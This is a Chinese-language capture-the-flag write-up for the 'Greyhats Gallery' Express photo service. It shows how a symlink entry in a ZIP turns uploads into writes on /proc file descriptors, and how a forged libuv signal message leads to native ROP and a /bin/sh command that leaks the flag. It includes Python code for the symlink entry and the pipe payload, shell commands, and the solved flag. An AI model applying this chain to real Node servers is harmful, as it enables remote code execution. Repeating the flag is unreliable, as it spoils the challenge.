# Greyhats Gallery

## 题目简述

题面是 Express 相册服务，支持上传图片或 ZIP。服务用 `unzip -o <archive> -d /app/uploads` 解压 ZIP，但没有拒绝符号链接；随后 multer 按用户提供的文件名在同一目录写上传文件。这个 Web 入口可以被转换成对 Node 进程 `/proc/<pid>/fd/<n>` 的写入。

真正决定利用成败的是固定版本、非 PIE 的 Node 24 二进制和 libuv signal pipe：向该 pipe 写入伪造的 `uv_signal_t` 消息可使 Node 在原生代码中跳入可控 ROP。因此本题虽位于原始 `web` 目录，最终应归为 `pwn`。

## 解题过程

### 从 ZIP 符号链接获得 procfd 写原语

解压函数没有检查 ZIP 条目类型：

```js
await execFileAsync("unzip", ["-o", zipPath, "-d", PHOTO_DIR]);
```

可在 ZIP 中把名为 `signal.jpg` 的条目设为 symlink，内容指向 `/proc/<node-pid>/fd/<write_fd>`。之后再以相同文件名普通上传，multer 会跟随这个链接，将上传内容写进目标 fd。参考构造如下：

```python
info = zipfile.ZipInfo("signal.jpg")
info.create_system = 3
info.external_attr = (stat.S_IFLNK | 0o777) << 16
archive.writestr(info, "/proc/<node-pid>/fd/<write_fd>")
```

若容器有 init wrapper，Node 未必是 PID 1。官方 solver 逐个上传指向 `/proc/<pid>/fd/0` 的探针链接，并以相册收集阶段能否 `stat` 该链接来定位 appuser 可访问的 Node PID；每次探针后通过删除接口清理，以免坏链接影响下一轮。

### libuv 假对象与 ROP

Node 的 signal pipe 接收的首部是 handle 指针和信号号。选择 Node 可写映射中已有的 `uv_signal_t` 风格位置，并让其 callback 字段指向一个 `pop ...; ret` gadget；官方版本中该结构还必须使用匹配的 `signum`、callback 偏移和受控返回偏移。写入 pipe 的第一阶段形状是：

```python
message = p64(handle) + p32(signum) + b"\x00" * 4
first_read = bytearray(512)
first_read[:16] = message
first_read[controlled_ret_offset:controlled_ret_offset + len(rop)] = rop
```

libuv 处理该假 handle 后进入 gadget，并从 signal pipe 读入第二阶段到 Node 的可写映射。第二阶段包含：

```text
read(signal_pipe_read_fd, writable_node_address, 0x200)
execve("/bin/sh", ["/bin/sh", "-c", command, NULL], NULL)
```

`command` 删除 `/app/uploads` 中的 procfd 链接，再把随机命名的 `/flag-*.txt` Base64 编码为 `/app/views/flag.ejs`，最后重启 Node。应用的 catch-all 路由会渲染 `/flag` 对应模板；构建时补丁会拒绝模板源码含有 `grey` 的路径，但 Base64 文本不含该子串，故可被渲染并在客户端解码。

```sh
rm -f /app/uploads/*.jpg
base64 /flag-*.txt > /app/views/flag.ejs
node /app/src/server.js
```

GET `/flag` 的响应经 Base64 解码即为 `grey{n0_5571_n0_pr0bl3m_(h0p3fully)_57djwlp5mdnduwpfnh5hdh5jdjdn_75e3009f9c931251_UUID}`。这验证了 ZIP 链接、pipe 写入、原生 ROP 和 flag 回传链都已生效。

## 方法总结

- 核心技巧：ZIP symlink 绕过上传目录边界，借 `/proc/<pid>/fd` 向 libuv signal pipe 投递伪对象，再完成 Node 原生 ROP。
- 识别信号：应用调用外部解压器且允许链接条目；同进程可访问 procfs；运行时二进制固定、非 PIE，并存在可控事件消息到函数指针的转换。
- 复用要点：Web 写文件原语不等于直接 RCE。这里必须先确认写入是否跟随符号链接、目标 PID/FD 是否可达、假对象字段与 Node 版本是否一致。Node、libuv 和容器镜像任一更新都会使地址与结构偏移失效。
